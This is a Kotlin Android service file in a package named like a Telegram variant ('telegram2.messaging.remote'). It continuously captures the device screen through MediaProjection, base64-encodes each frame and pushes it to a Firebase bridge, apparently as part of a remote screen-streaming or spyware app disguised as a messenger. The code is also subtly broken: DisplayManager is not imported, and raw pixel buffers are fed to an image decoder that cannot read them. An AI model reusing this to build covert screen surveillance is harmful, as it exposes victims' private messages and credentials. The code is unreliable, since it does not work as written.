package com.telegram2.messaging.remote

import android.app.Notification
import android.app.NotificationChannel
import android.app.NotificationManager
import android.app.Service
import android.content.Context
import android.content.Intent
import android.graphics.Bitmap
import android.graphics.BitmapFactory
import android.graphics.PixelFormat
import android.media.ImageReader
import android.media.projection.MediaProjection
import android.media.projection.MediaProjectionManager
import android.os.Build
import android.os.Handler
import android.os.IBinder
import android.util.Base64
import java.io.ByteArrayOutputStream
import java.util.concurrent.Executors

class ScreenCaptureService : Service() {
    private var mediaProjection: MediaProjection? = null
    private var imageReader: ImageReader? = null
    private lateinit var handler: Handler

    override fun onCreate() {
        super.onCreate()
        handler = Handler(mainLooper)
        createNotificationChannel()
        startForeground(1, Notification.Builder(this, "capture_channel")
            .setContentTitle("Screen Capture Active")
            .setSmallIcon(android.R.drawable.ic_menu_camera)
            .build())
    }

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        val code = intent?.getIntExtra("code", -1) ?: -1
        val data = intent?.getParcelableExtra<Intent>("data")
        if (code != -1 && data != null) {
            startCapture(code, data)
        }
        return START_STICKY
    }

    private fun startCapture(code: Int, data: Intent) {
        val mpm = getSystemService(Context.MEDIA_PROJECTION_SERVICE) as MediaProjectionManager
        mediaProjection = mpm.getMediaProjection(code, data)
        val displayMetrics = resources.displayMetrics
        val width = displayMetrics.widthPixels
        val height = displayMetrics.heightPixels
        val density = displayMetrics.densityDpi
        imageReader = ImageReader.newInstance(width, height, PixelFormat.RGBA_8888, 2)
        mediaProjection?.createVirtualDisplay(
            "ScreenCapture",
            width, height, density,
            DisplayManager.VIRTUAL_DISPLAY_FLAG_AUTO_MIRROR,
            imageReader?.surface, null, handler
        )
        val executor = Executors.newSingleThreadExecutor()
        imageReader?.setOnImageAvailableListener({ reader ->
            val image = reader.acquireLatestImage() ?: return@setOnImageAvailableListener
            val planes = image.planes
            val buffer = planes[0].buffer
            val bytes = ByteArray(buffer.remaining())
            buffer.get(bytes)
            image.close()
            val bitmap = BitmapFactory.decodeByteArray(bytes, 0, bytes.size) ?: return@setOnImageAvailableListener
            val stream = ByteArrayOutputStream()
            bitmap.compress(Bitmap.CompressFormat.JPEG, 50, stream)
            val base64 = Base64.encodeToString(stream.toByteArray(), Base64.NO_WRAP)
            FirebaseBridge.updateScreenFrame(base64)
        }, handler)
    }

    private fun createNotificationChannel() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            val channel = NotificationChannel(
                "capture_channel",
                "Screen Capture",
                NotificationManager.IMPORTANCE_LOW
            )
            getSystemService(NotificationManager::class.java).createNotificationChannel(channel)
        }
    }

    override fun onBind(intent: Intent?): IBinder? = null
    override fun onDestroy() {
        mediaProjection?.stop()
        imageReader?.close()
        super.onDestroy()
    }
}
